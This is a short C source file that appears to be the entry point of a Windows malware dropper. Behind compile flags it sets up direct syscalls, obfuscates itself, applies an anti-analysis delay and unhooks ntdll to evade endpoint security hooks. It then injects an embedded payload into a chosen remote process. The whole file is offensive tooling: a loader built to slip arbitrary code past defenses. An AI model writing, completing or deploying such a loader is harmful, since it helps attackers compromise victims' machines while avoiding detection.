#include "common.h"


int main() {

    DebugPrint("Debug mode enabled.\n");
    DebugPrint("Dropper started...\n");

#ifdef SYSCALL_ENABLED
    if (!InitializeSyscalls()) {
        DebugPrint("[X] Failed to initialize syscalls.\n");
        return FALSE;
    }
#endif

    DebugPrint("\n### Setup Complete ###\n\n");

#ifdef ENTROPY_REDUCTION_ENABLED
    init_obfuscation();
#endif

#ifdef ANTI_ANALYSIS_ENABLED
    AntiAnalysis(30000); // 30 seconds timeout
#endif

#ifdef UNHOOKING_ENABLED
    unhookingNtdll();
#endif

    BOOL bSuccess;
    DebugPrint("[i] Setup complete... Beginning injection!\n");
#ifdef PROCESS_NAME_ENABLED
    LPWSTR szProcessName =  (LPWSTR)ProcessName;
    DebugPrint("[i] Targeting process %ws for remote operations...\n", szProcessName);
    bSuccess = inject_payload(Payload, PayloadSize, szProcessName);
#else
    bSuccess = inject_payload(Payload, PayloadSize);
#endif


#ifdef DEBUG
    if (bSuccess) {
        DebugPrint("[i] Payload injected successfully.\n");
    } else {
        DebugPrint("[X] Failed to inject payload.\n");
    }
    getchar();
#endif

    return 0;
}